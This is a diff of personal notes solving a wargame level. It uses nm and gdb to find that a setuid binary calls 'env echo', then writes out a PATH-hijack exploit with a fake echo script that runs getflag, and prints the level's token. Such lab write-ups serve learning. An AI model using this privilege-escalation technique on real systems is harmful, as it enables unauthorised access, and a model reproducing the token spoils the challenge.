@@ -3,7 +3,7 @@ Notes:
     how to access content?
     `cat` shows binary, as expected
     Maybe `gdb`? If it's in C*
-    _
+_
     also `nm -u` to see functions called in program
     output:
     `    w _Jv_RegisterClasses
@@ -16,7 +16,7 @@ Notes:
          U system@@GLIBC_2.0
     `
     *It's C yihaa
-    _
+_
     `nm` shows:
     `
     [...]
@@ -29,13 +29,33 @@ Notes:
         U system@@GLIBC_2.0
     `
     I guess we're looking at `setresgid` and `setresuid` more specifically
-    _
+_
     Inside `gdb ./level03`
     `run` gives : `Exploit me`
     `list` won't work since program isn't called 'level03.c'
-    _
+_
     `layour src` or `CTRL + X then A` to open TUI mode or start with `gdb -tui`
-    _
+_
     `disas main` shows us assembler dump of main
     `layout next` to inspect in top part of gdb window
-    
+_
+    What about `s` file permission?
+_
+    `x/s 0x80485e0` prints the content of function at that address
+    output: `/usr/bin/env echo Exploit me`
+    The idea would be to override $PATH and `echo` function so that my `echo` is called instead of real one?
+_
+    flag:
+    `mkdir /tmp/mine`
+    Create `echo` file that contains:
+    `
+        #!/bin/sh
+        getflag
+    `
+    `chmod +x echo` to give exec rights
+    `export PATH=/tmp/mine:$PATH` to add it before 'real' `echo`
+    `cd /home/user/level03`
+    `./level03`
+    higher user executes `getflag` >> flag is shown in output
+token:
+    `qi0maab88jeaj46qoumi7maus`
